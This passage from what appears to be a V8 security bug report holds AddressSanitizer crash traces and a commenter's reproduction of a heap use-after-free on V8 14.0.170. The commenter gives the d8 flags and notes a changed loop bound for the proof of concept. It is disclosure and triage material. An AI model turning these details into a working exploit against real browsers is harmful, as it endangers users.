    #8 0x5975a1ba2227 in v8::internal::Snapshot::Initialize(v8::internal::Isolate*) v8/src/snapshot/snapshot.cc:198:19
    #9 0x59759f572200 in v8::Isolate::Initialize(v8::Isolate*, v8::Isolate::CreateParams const&) v8/src/api/api.cc:10027:8
    #10 0x59759f5733dd in v8::Isolate::New(v8::IsolateGroup const&, v8::Isolate::CreateParams const&) v8/src/api/api.cc:10066:3
    #11 0x59759f5733dd in v8::Isolate::New(v8::Isolate::CreateParams const&) v8/src/api/api.cc:10060:10
    #12 0x59759ebaca0e in v8::Worker::ExecuteInThread() v8/src/d8/d8.cc:5395:14
    #13 0x59759ebac77c in v8::Worker::WorkerThread::Run() v8/src/d8/d8.cc:5226:11
    #14 0x59759f4b1952 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:627:5
    #15 0x59759f4b1952 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1229:11
    #16 0x59759eaeef86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

Thread T1 (WorkerThread) created by T0 here:
    #0 0x59759ead5871 in pthread_create /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:250:3
    #1 0x59759f4b1681 in v8::base::Thread::Start() v8/src/base/platform/platform-posix.cc:1261:14
    #2 0x59759eb98dd7 in v8::Worker::StartWorkerThread(v8::Isolate*, std::__Cr::shared_ptr<v8::Worker>, v8::base::Thread::Priority) v8/src/d8/d8.cc:5210:16
    #3 0x59759eb9835b in v8::Shell::WorkerNew(v8::FunctionCallbackInfo<v8::Value> const&) v8/src/d8/d8.cc:3345:10
    #4 0x59759f638aa1 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) v8/src/api/api-arguments-inl.h:93:3
    #5 0x59759f63443e in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) v8/src/builtins/builtins-api.cc:104:16
    #6 0x59759f631195 in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:135:3
    #7 0x59759f630117 in v8::internal::Builtin_HandleApiConstruct(int, unsigned long*, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:126:1
    #8 0x5975a67f29bc in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #9 0x5975a66b9381 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #10 0x5975a69e06bc in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #11 0x5975a66b8862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #12 0x5975a66b3ce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #13 0x5975a66b3a2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #14 0x59759fd560c2 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #15 0x59759fd560c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #16 0x59759fd5a229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #17 0x59759f4f5578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1965:7
    #18 0x59759eb6fb61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1028:44
    #19 0x59759eba9545 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5077:10
    #20 0x59759ebb6631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6029:37
    #21 0x59759ebb563e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:5937:18
    #22 0x59759ebb9ca8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6803:18
    #23 0x737635534249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-use-after-free v8/src/heap/base-space.h:28:5 in v8::internal::BaseSpace::heap() const
Shadow bytes around the buggy address:
  0x7066349e7580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7066349e7600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7066349e7680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7066349e7700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7066349e7780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x7066349e7800: fa fa fa fa fd[fd]fd fd fd fd fd fd fd fd fd fd
  0x7066349e7880: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa
  0x7066349e7900: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7066349e7980: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
  0x7066349e7a00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x7066349e7a80: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==266343==ABORTING

## V8 sandbox violation detected!

```

### da...@hirsch.cx (2025-07-10)

I was finally able to reproduce the UAF on V8 14.0.170 with the poc from C#19 but with a modified number of iterations (`for (let i = 0; i<2**18 + 2 ** 14;) {`).
Please also note that ASAN will report an out-of-bounds access on an already freed buffer as an heap buffer overflow instead of a heap UAF; this might shadow the UAF at first sight...

Stack trace for completeness:

```
> ASAN_OPTIONS="redzone=16:max_redzone=32:thread_local_quarantine_size_kb=1:quarantine_size_mb=4096" /home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8 --expose-memory-corruption-api --hole-fuzzing --jit-fuzzing --single-threaded deterministic_uaf_v14.js 
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1602114 edges
2
1
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3617: new_capacity < old_capacity (26927 vs. -673021702)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 4245: new_size <= old_size (215424 vs. -1089206312)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3329: size > 2 * kTaggedSize (-1089421736 vs. 8)
# Ignoring debug check failure in ../../v8/src/objects/free-space-inl.h, line 30: size > 2 * kTaggedSize (-1089421736 vs. 8)
# Ignoring debug check failure in ../../v8/src/heap/memory-chunk.cc, line 187: addr >= Metadata()->area_start() (139370601169340 vs. 139371690590224)
=================================================================
==303139==ERROR: AddressSanitizer: heap-use-after-free on address 0x79921bee5b60 at pc 0x58a3ed6a68f7 bp 0x7ffe1ab708c0 sp 0x7ffe1ab708b8
READ of size 4 at 0x79921bee5b60 thread T0
    #0 0x58a3ed6a68f6 in int std::__Cr::__cxx_atomic_load<int>(std::__Cr::__cxx_atomic_base_impl<int> const volatile*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/support/c11.h:75:10
    #1 0x58a3ed6a68f6 in std::__Cr::__atomic_base<int, false>::load(std::__Cr::memory_order) const volatile third_party/libc++/src/include/__atomic/atomic.h:66:12
    #2 0x58a3ed6a68f6 in int std::__Cr::atomic_load_explicit<int>(std::__Cr::atomic<int> const volatile*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/atomic.h:533:15
    #3 0x58a3ed6a68f6 in v8::base::Acquire_Load(int const volatile*) v8/src/base/atomicops.h:255:10
    #4 0x58a3ed6a68f6 in unsigned int v8::base::AsAtomicImpl<int>::Acquire_Load<unsigned int>(unsigned int*) v8/src/base/atomic-utils.h:81:9
    #5 0x58a3ed6a68f6 in unsigned int heap::base::BasicSlotSet<4ul>::Bucket::LoadCell<(heap::base::BasicSlotSet<4ul>::AccessMode)0>(int) v8/src/heap/base/basic-slot-set.h:295:16
    #6 0x58a3ed80542e in unsigned long heap::base::BasicSlotSet<4ul>::Iterate<(heap::base::BasicSlotSet<4ul>::AccessMode)0, unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda'(unsigned long), unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda0'(unsigned long)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda0'(unsigned long)) v8/src/heap/base/basic-slot-set.h:352:44
    #7 0x58a3ed80523b in unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode) v8/src/heap/slot-set.h:154:26
    #8 0x58a3ed80523b in v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long) v8/src/heap/remembered-set.h:80:17
    #9 0x58a3ed76b2a5 in v8::internal::RememberedSet<(v8::internal::RememberedSetType)0>::CheckNoneInRange(v8::internal::MutablePageMetadata*, unsigned long, unsigned long) v8/src/heap/remembered-set.h:155:5
    #10 0x58a3ed76b2a5 in v8::internal::Heap::VerifySlotRangeHasNoRecordedSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:6697:3
    #11 0x58a3ed76b2a5 in v8::internal::(anonymous namespace)::VerifyNoNeedToClearSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:3353:18
    #12 0x58a3ed76b2a5 in v8::internal::Heap::CreateFillerObjectAtRaw(v8::internal::WritableFreeSpace const&, v8::internal::ClearFreedMemoryMode, v8::internal::ClearRecordedSlots, v8::internal::Heap::VerifyNoSlotsRecorded) v8/src/heap/heap.cc:3402:5
    #13 0x58a3ed734554 in v8::internal::Heap::NotifyObjectSizeChange(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ClearRecordedSlots) v8/src/heap/heap.cc:4261:3
    #14 0x58a3ed7351ce in void v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray>(v8::internal::Tagged<v8::internal::FixedDoubleArray>, int, int) v8/src/heap/heap.cc:3641:5
    #15 0x58a3ee227a1c in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLengthImpl(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int, v8::internal::DirectHandle<v8::internal::FixedArrayBase>) v8/src/objects/elements.cc:867:7
    #16 0x58a3ee227a1c in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/elements.cc:815:12
    #17 0x58a3ee8bd742 in v8::internal::JSArray::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/objects.cc:4870:40
    #18 0x58a3ecbae147 in v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&) v8/src/builtins/accessors.cc:209:7
    #19 0x58a3ee60dc22 in v8::internal::PropertyCallbackArguments::CallAccessorSetter(v8::internal::DirectHandle<v8::internal::AccessorInfo>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/api/api-arguments-inl.h:460:3
    #20 0x58a3ee8a3baf in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:1621:24
    #21 0x58a3ee8aec0d in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*) v8/src/objects/objects.cc:2384:16
    #22 0x58a3ee8ae13c in v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:2478:9
    #23 0x58a3ee5c2ace in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) v8/src/ic/ic.cc:1972:5
    #24 0x58a3ee5dd786 in v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/ic/ic.cc:2974:3
    #25 0x58a3ee5dca58 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) v8/src/ic/ic.cc:2946:1
    #26 0x58a3f3eed67c in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #27 0x58a3f40c7853 in Builtins_SetNamedPropertyHandler setup-isolate-deserialize.cc
    #28 0x58a3f3daeba2 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #29 0x58a3f3da9d26 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #30 0x58a3f3da9a6a in Builtins_JSEntry setup-isolate-deserialize.cc
    #31 0x58a3ed2faa36 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #32 0x58a3ed2faa36 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #33 0x58a3ed2feb09 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #34 0x58a3eca93bff in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1937:7
    #35 0x58a3ec201fca in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1033:44
    #36 0x58a3ec248046 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5351:10
    #37 0x58a3ec25671c in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6309:37
    #38 0x58a3ec25545e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:6217:18
    #39 0x58a3ec25a298 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:7102:18
    #40 0x7cf21ca52249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

0x79921bee5b60 is located 0 bytes inside of 128-byte region [0x79921bee5b60,0x79921bee5be0)
freed by thread T1 (WorkerThread) here:
    #0 0x58a3ec1b72d2 in operator delete(void*, unsigned long) (/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8+0x266f2d2) (BuildId: 736ced444c8e1262)
    #1 0x58a3edb8320f in void heap::base::BasicSlotSet<4ul>::ReleaseBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0>(unsigned long) v8/src/heap/base/basic-slot-set.h:409:5
    #2 0x58a3edb8320f in heap::base::BasicSlotSet<4ul>::Delete(heap::base::BasicSlotSet<4ul>*) v8/src/heap/base/basic-slot-set.h:83:17
    #3 0x58a3edb8320f in v8::internal::MutablePageMetadata::ReleaseSlotSet(v8::internal::RememberedSetType) v8/src/heap/mutable-page-metadata.cc:236:5
    #4 0x58a3edb8320f in v8::internal::MutablePageMetadata::ReleaseAllocatedMemoryNeededForWritableChunk() v8/src/heap/mutable-page-metadata.cc:198:3
    #5 0x58a3edb2e5eb in v8::internal::MemoryAllocator::PreFreeMemory(v8::internal::MutablePageMetadata*) v8/src/heap/memory-allocator.cc:344:19
    #6 0x58a3edb2ed46 in v8::internal::MemoryAllocator::Free(v8::internal::MemoryAllocator::FreeMode, v8::internal::MutablePageMetadata*) v8/src/heap/memory-allocator.cc:361:3
    #7 0x58a3edbb9f2d in v8::internal::PagedSpaceBase::TearDown() v8/src/heap/paged-spaces.cc:107:33
    #8 0x58a3ed804574 in v8::internal::PagedSpaceBase::~PagedSpaceBase() v8/src/heap/paged-spaces.h:123:32
    #9 0x58a3ed80329c in v8::internal::OldSpace::~OldSpace() v8/src/heap/paged-spaces.h:444:25
    #10 0x58a3ed785761 in std::__Cr::default_delete<v8::internal::Space>::operator()(v8::internal::Space*) const third_party/libc++/src/include/__memory/unique_ptr.h:77:5
    #11 0x58a3ed785761 in std::__Cr::unique_ptr<v8::internal::Space, std::__Cr::default_delete<v8::internal::Space>>::reset(v8::internal::Space*) third_party/libc++/src/include/__memory/unique_ptr.h:290:7
    #12 0x58a3ed785761 in v8::internal::Heap::TearDown() v8/src/heap/heap.cc:6458:15
    #13 0x58a3ed385eea in v8::internal::Isolate::Deinit() v8/src/execution/isolate.cc:4622:9
    #14 0x58a3ed384941 in v8::internal::Isolate::Deinitialize(v8::internal::Isolate*) v8/src/execution/isolate.cc:4195:12
    #15 0x58a3ed38476c in v8::internal::Isolate::Delete(v8::internal::Isolate*) v8/src/execution/isolate.cc:4176:3
    #16 0x58a3ec24d1cb in v8::Worker::ExecuteInThread() v8/src/d8/d8.cc:5800:13
    #17 0x58a3ec24b9bc in v8::Worker::WorkerThread::Run() v8/src/d8/d8.cc:5504:11
    #18 0x58a3eca4e779 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:632:5
    #19 0x58a3eca4e779 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1273:11
    #20 0x58a3ec17afd6 in asan_thread_start(void*) asan_interceptors.cpp

previously allocated by thread T1 (WorkerThread) here:
    #0 0x58a3ec1b666d in operator new(unsigned long) (/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8+0x266e66d) (BuildId: 736ced444c8e1262)
    #1 0x58a3ed72cdb5 in void heap::base::BasicSlotSet<4ul>::Insert<(heap::base::BasicSlotSet<4ul>::AccessMode)1>(unsigned long) v8/src/heap/base/basic-slot-set.h:115:16
    #2 0x58a3ec28d5d4 in v8::internal::WriteBarrier::CombinedWriteBarrierInternal(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::WriteBarrierMode) v8/src/heap/heap-write-barrier-inl.h:51:7
    #3 0x58a3ee66e0d7 in v8::internal::JSReceiver::SetProperties(v8::internal::Tagged<v8::internal::HeapObject>) v8/src/objects/js-objects.cc:836:3
    #4 0x58a3ee6a0327 in v8::internal::(anonymous namespace)::MigrateFastToFast(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::Map>) v8/src/objects/js-objects.cc:3280:11
    #5 0x58a3ee6a0327 in v8::internal::JSObject::MigrateToMap(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::Map>, int) v8/src/objects/js-objects.cc:3441:5
    #6 0x58a3ee76f761 in v8::internal::LookupIterator::ApplyTransitionToDataProperty(v8::internal::DirectHandle<v8::internal::JSReceiver>) v8/src/objects/lookup.cc:706:5
    #7 0x58a3ee8b6c44 in v8::internal::Object::TransitionAndWriteDataProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin) v8/src/objects/objects.cc:2787:7
    #8 0x58a3ee8b557a in v8::internal::Object::AddDataProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, v8::internal::EnforceDefineSemantics) v8/src/objects/objects.cc:2771:10
    #9 0x58a3ee6a8894 in v8::internal::JSObject::AddProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes) v8/src/objects/js-objects.cc:3642:3
    #10 0x58a3edd74494 in v8::internal::SimpleInstallFunction(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSObject>, char const*, v8::internal::Builtin, int, v8::internal::AdaptArguments, v8::internal::PropertyAttributes) v8/src/init/bootstrapper.cc:1005:3
    #11 0x58a3eddaa2ba in v8::internal::Genesis::InitializeGlobal_js_regexp_escape() v8/src/init/bootstrapper.cc:5835:3
    #12 0x58a3eddaa2ba in v8::internal::Genesis::InitializeExperimentalGlobal() v8/src/init/bootstrapper.cc:5094:3
    #13 0x58a3eddc27a6 in v8::internal::Genesis::Genesis(v8::internal::Isolate*, v8::internal::MaybeDirectHandle<v8::internal::JSGlobalProxy>, v8::Local<v8::ObjectTemplate>, unsigned long, v8::internal::DeserializeEmbedderFieldsCallback, v8::MicrotaskQueue*) v8/src/init/bootstrapper.cc:7024:5
    #14 0x58a3edd70264 in v8::internal::Bootstrapper::CreateEnvironment(v8::internal::MaybeDirectHandle<v8::internal::JSGlobalProxy>, v8::Local<v8::ObjectTemplate>, v8::ExtensionConfiguration*, unsigned long, v8::internal::DeserializeEmbedderFieldsCallback, v8::MicrotaskQueue*) v8/src/init/bootstrapper.cc:359:13
    #15 0x58a3ecae60ce in v8::InvokeBootstrapper<v8::internal::NativeContext>::Invoke(v8::internal::Isolate*, v8::internal::MaybeDirectHandle<v8::internal::JSGlobalProxy>, v8::Local<v8::ObjectTemplate>, v8::ExtensionConfiguration*, unsigned long, v8::internal::DeserializeEmbedderFieldsCallback, v8::MicrotaskQueue*) v8/src/api/api.cc:6620:39
    #16 0x58a3ecae60ce in v8::internal::DirectHandle<v8::internal::NativeContext> v8::CreateEnvironment<v8::internal::NativeContext>(v8::internal::Isolate*, v8::ExtensionConfiguration*, v8::MaybeLocal<v8::ObjectTemplate>, v8::MaybeLocal<v8::Value>, unsigned long, v8::internal::DeserializeEmbedderFieldsCallback, v8::MicrotaskQueue*) v8/src/api/api.cc:6730:21
    #17 0x58a3ecae60ce in v8::NewContext(v8::Isolate*, v8::ExtensionConfiguration*, v8::MaybeLocal<v8::ObjectTemplate>, v8::MaybeLocal<v8::Value>, unsigned long, v8::internal::DeserializeEmbedderFieldsCallback, v8::MicrotaskQueue*) v8/src/api/api.cc:6771:43
    #18 0x58a3ecae7176 in v8::Context::New(v8::Isolate*, v8::ExtensionConfiguration*, v8::MaybeLocal<v8::ObjectTemplate>, v8::MaybeLocal<v8::Value>, v8::DeserializeInternalFieldsCallback, v8::MicrotaskQueue*, v8::DeserializeContextDataCallback, v8::DeserializeAPIWrapperCallback) v8/src/api/api.cc:6786:10
    #19 0x58a3ec23b7fd in v8::Shell::CreateEvaluationContext(v8::Isolate*) v8/src/d8/d8.cc:4465:28
    #20 0x58a3ec24c148 in v8::Worker::ExecuteInThread() v8/src/d8/d8.cc:5699:11
    #21 0x58a3ec24b9bc in v8::Worker::WorkerThread::Run() v8/src/d8/d8.cc:5504:11
    #22 0x58a3eca4e779 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:632:5
    #23 0x58a3eca4e779 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1273:11
    #24 0x58a3ec17afd6 in asan_thread_start(void*) asan_interceptors.cpp

Thread T1 (WorkerThread) created by T0 here:
    #0 0x58a3ec1618c1 in pthread_create (/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8+0x26198c1) (BuildId: 736ced444c8e1262)
    #1 0x58a3eca4e4a1 in v8::base::Thread::Start() v8/src/base/platform/platform-posix.cc:1305:14
    #2 0x58a3ec231637 in v8::Worker::StartWorkerThread(v8::Isolate*, std::__Cr::shared_ptr<v8::Worker>, v8::base::Thread::Priority) v8/src/d8/d8.cc:5484:16
    #3 0x58a3ec230b8c in v8::Shell::WorkerNew(v8::FunctionCallbackInfo<v8::Value> const&) v8/src/d8/d8.cc:3468:10
    #4 0x58a3ecbd79b1 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) v8/src/api/api-arguments-inl.h:93:3
    #5 0x58a3ecbd33d5 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) v8/src/builtins/builtins-api.cc:104:16
    #6 0x58a3ecbd005b in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:135:3
    #7 0x58a3ecbcefd7 in v8::internal::Builtin_HandleApiConstruct(int, unsigned long*, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:126:1
    #8 0x58a3f3eed57c in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc
    #9 0x58a3f3daf6c1 in Builtins_InterpreterPushArgsThenFastConstructFunction setup-isolate-deserialize.cc
    #10 0x58a3f40e14fc in Builtins_ConstructHandler setup-isolate-deserialize.cc
    #11 0x58a3f3daeba2 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #12 0x58a3f3da9d26 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #13 0x58a3f3da9a6a in Builtins_JSEntry setup-isolate-deserialize.cc
    #14 0x58a3ed2faa36 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
